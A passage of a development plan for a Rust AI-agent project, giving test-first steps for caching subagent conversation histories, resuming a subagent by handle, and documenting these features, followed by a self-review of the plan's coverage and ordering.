`path_for` guard including `RESERVED_WINDOWS_NAMES`, the same temp-file-and-
rename write, the same "unparseable is treated as absent, not fatal" rule, the
same `prune_before` scan. Follow it rather than inventing a second convention.

- [ ] **Step 2: Write the failing tests**

```rust
#[test]
fn a_child_round_trips() {
    let d = tempfile::tempdir().unwrap();
    let c = SubagentCache::open(d.path().into(), 1_000_000).unwrap();
    let child = StoredChild { agent: "impl".into(), history: vec![msg("hi")],
        created_at: Utc::now(), updated_at: Utc::now() };
    assert!(c.put("h1", &child).unwrap());
    assert_eq!(c.get("h1").unwrap().agent, "impl");
}

#[test]
fn an_oversized_history_is_refused_not_truncated() {
    // Dropping old messages can leave a `tool_use` whose `tool_result`
    // is gone, which makes the history unloadable — the invariant Task 1
    // of the subagents branch existed to protect.
    let d = tempfile::tempdir().unwrap();
    let c = SubagentCache::open(d.path().into(), 64).unwrap();
    let big = StoredChild { agent: "impl".into(),
        history: vec![msg(&"x".repeat(10_000))],
        created_at: Utc::now(), updated_at: Utc::now() };
    assert!(!c.put("h2", &big).unwrap());
    assert!(c.get("h2").is_none());
}

#[test]
fn a_handle_that_is_not_a_safe_filename_is_refused() {
    let d = tempfile::tempdir().unwrap();
    let c = SubagentCache::open(d.path().into(), 1_000_000).unwrap();
    for bad in ["..", "a/b", "", "con", "CON"] {
        assert!(c.put(bad, &child()).is_err(), "accepted {bad}");
    }
}

#[test]
fn pruning_drops_only_entries_older_than_the_cutoff() {
    // ... put two children with explicit `updated_at`, prune between
    // them, assert one survives.
}

#[test]
fn an_unreadable_entry_is_absent_rather_than_fatal() {
    let d = tempfile::tempdir().unwrap();
    let c = SubagentCache::open(d.path().into(), 1_000_000).unwrap();
    std::fs::write(d.path().join("h3.json"), "{ not json").unwrap();
    assert!(c.get("h3").is_none());
}
```

- [ ] **Step 3: Run, fail, implement, run, pass**

Run: `cargo test -p sapphire-agent subagent_cache::`

- [ ] **Step 4: Config and wiring**

```toml
[subagent_cache]
max_history_bytes = 8_388_608
retain_days = 7
```

Open it in `src/main.rs` the way `DigestCache` is opened, and call
`prune_before(Utc::now() - Duration::days(retain_days))` from the same periodic
sweep that prunes digests.

- [ ] **Step 5: Commit**

```bash
cargo test -p sapphire-agent
cargo clippy --workspace -- -D warnings
git checkout -- Cargo.lock
git add -A
git commit -m "feat(subagent): cache child histories outside the workspace"
```

---

## Task 6: Resume a subagent by handle

**Files:**
- Modify: `src/tools/subagent.rs`

**Interfaces:**
- Consumes: `SubagentCache`, `StoredChild`

- [ ] **Step 1: Write the failing tests**

```rust
#[tokio::test]
async fn a_resumed_child_continues_its_own_history() {
    // The second turn's provider call must see the first turn's
    // messages, and must not see the parent's.
    let log = dispatch_then_resume().await;
    let second = log.last_request();
    assert!(second.messages.iter().any(|m| text_of(m).contains("first task")));
    assert!(!second.messages.iter().any(|m| text_of(m).contains("PARENT ONLY")));
}

#[tokio::test]
async fn resume_recomputes_the_tool_list_so_the_depth_cap_still_holds() {
    // Restoring a stored tool list would make resume the hole that the
    // offer gate in `TurnLoop::run` exists to close. Assert by full
    // equality, not just "no subagent".
    let specs = resume_and_capture_specs().await;
    let names: Vec<&str> = specs.iter().map(|s| s.name.as_ref()).collect();
    assert_eq!(names, vec!["client_file_read", "client_shell"]);
}

#[tokio::test]
async fn an_unknown_handle_is_recoverable_and_says_what_to_do() {
    let err = resume("nosuchhandle").await.unwrap_err().to_string();
    assert!(err.contains("dispatch"), "got: {err}");
}

#[tokio::test]
async fn a_busy_handle_is_refused() {
    // Two turns resuming one child would interleave writes into one
    // history.
    let (first, second) = resume_twice_concurrently().await;
    assert!(first.is_ok());
    assert!(second.unwrap_err().to_string().contains("in use"));
}

#[tokio::test]
async fn an_agent_definition_that_disappeared_is_reported() {
    let err = resume_after_removing_definition().await.unwrap_err().to_string();
    assert!(err.contains("impl"), "got: {err}");
}

#[tokio::test]
async fn an_over_cap_child_still_answers_but_says_it_is_not_resumable() {
    let out = dispatch_with_tiny_cap().await.unwrap();
    assert!(out.contains("not resumable"), "got: {out}");
    assert!(out.contains("the answer"), "answer was lost: {out}");
}
```

- [ ] **Step 2: Run, watch them fail**

Run: `cargo test -p sapphire-agent subagent::`

- [ ] **Step 3: Extend the input schema**

```rust
"properties": {
    "agent":  { "type": "string", "description": "Which agent to delegate to. Mutually exclusive with `resume`." },
    "resume": { "type": "string", "description": "A handle from an earlier delegation, to continue that subagent's conversation. Mutually exclusive with `agent`." },
    "prompt": { "type": "string", "description": "The task, or the next instruction for a resumed subagent." }
},
"required": ["prompt"]
```

Neither given, or both given, is a recoverable error naming the rule.

- [ ] **Step 4: Implement**

New dispatch: generate a handle (`Uuid::now_v7()`, rendered simple — it must
pass `SubagentCache::path_for`), run as today, then `put` the resulting history.
Prefix the answer:

```
[subagent impl · handle 0193f2a1c4d17b2e]
<answer>
```

and when `put` returned `Ok(false)`:

```
[subagent impl · not resumable: history exceeded the cache limit]
<answer>
```

Resume: `get` the handle; reload the definition by its stored `agent` name from
the current `agents` list — **not** from anything stored — so
`subagent_tool_specs` recomputes the offered list; append the new user message to
the stored history; run `TurnLoop` with that history; `put` the result back.

Mark a handle busy for the duration and refuse a concurrent resume. A
`Mutex<HashSet<String>>` on `SubagentTool` is enough; release it on every exit
path, including error and cancellation — hold a guard rather than remembering to
remove the entry, for the same reason `TerminalReservation` is a `Drop` guard.

- [ ] **Step 5: Run and commit**

```bash
cargo test -p sapphire-agent
cargo clippy --workspace -- -D warnings
git checkout -- Cargo.lock
git add -A
git commit -m "feat(subagent): resume a delegated conversation by handle"
```

---

## Task 7: Documentation

**Files:**
- Modify: `README.md`
- Modify: `docs/superpowers/specs/2026-09-02-skills-and-subagent-resume-design.md`
  (a `## 実装時の訂正` section, only if implementation contradicted the spec)

- [ ] **Step 1: Document the skills feature in README.md**

Cover: what a skill is and where the directory lives on each platform; the
`SAPPHIRE_AGENT_SKILLS_DIR` override; `skills = true` on a memory namespace and
why it is off by default; the four tools and their permission kinds; that only
`https` sources are accepted; that an install needs `git` and a shell on the
editor's machine; both accepted layouts.

State plainly that **skills require an ACP client with terminal support**, so
Matrix, Discord and voice never see them.

- [ ] **Step 2: Document subagent resume**

The handle line's shape, that resume is best-effort — a pruned or oversized
child is gone and a fresh dispatch is the answer — and that the cache lives
outside the workspace so a child's transcript never enters the retrieve index.

- [ ] **Step 3: Record any spec corrections**

If anything in this plan proved wrong during implementation, write it into the
spec's `## 実装時の訂正` in the spec's own voice. A spec that still asserts
something the branch disproved is worse than no spec.

- [ ] **Step 4: Final verification and commit**

```bash
cargo test --workspace
cargo fmt --all
cargo clippy --workspace -- -D warnings
git checkout -- Cargo.lock
git add -A
git commit -m "docs: document skills and subagent resume"
```

---

## Self-review

**Spec coverage.** Client-side checkout → Tasks 2-4. Per-namespace gate → Task 3
Steps 1/5. `skill` two modes and the absolute-directory header → Task 3.
`fs`-to-terminal fallback → Task 3 Step 6. Discipline in the tool description
rather than `TOOLS.md` → Task 3 Step 7. Install/update/uninstall with `https`
only, derived destination names, dirty-checkout refusal, remote re-validation →
Task 4. Both index layouts → Tasks 2 and 3. Cache with refuse-over-cap →
Task 5. Resume, definition re-read, busy refusal, handle line → Task 6.
Documentation → Task 7.

**Two spec items are deliberately not tasks.** The action-to-tool mapping in
`TOOLS.md` is workspace content, not code — it belongs in the operator's own
workspace, and Task 7 documents that it should be written there. `GIT_TERMINAL_PROMPT=0`
is folded into Task 4 Step 3 rather than given its own task.

**Placeholder scan.** No "add error handling", no "similar to Task N", no step
without its code. Three questions that a first draft left to the implementer
were resolved against the source before this plan was finished, and are now
stated as facts with their evidence: this crate has no `lib.rs` (so the resolver
tests live in `src/skills.rs`, not `tests/`), no registered tool name begins with
`skill` (so the gate uses an exact match anyway), and `create_terminal` has no
environment parameter (so `GIT_TERMINAL_PROMPT=0` goes through `env`).

**Type consistency.** `SkillIndex`/`SkillEntry` are produced in Task 2 and
consumed in Tasks 3 and 4 under the same names. `StoredChild` and
`SubagentCache`'s six methods are produced in Task 5 and consumed in Task 6.
`run_client_command`/`ClientRun` are produced in Task 1 and consumed in Tasks 3
and 4. `validate_entry_name` is used by both `destination_name` (Task 2) and
`skill_uninstall` (Task 4).

**Ordering risk.** Task 1 is a pure refactor with no new tests, so a reviewer
should judge it on the mechanical diff, not on coverage. Tasks 2 and 5 are pure
and could run in parallel with anything; Tasks 3, 4 and 6 each depend on their
predecessor and must run in order.
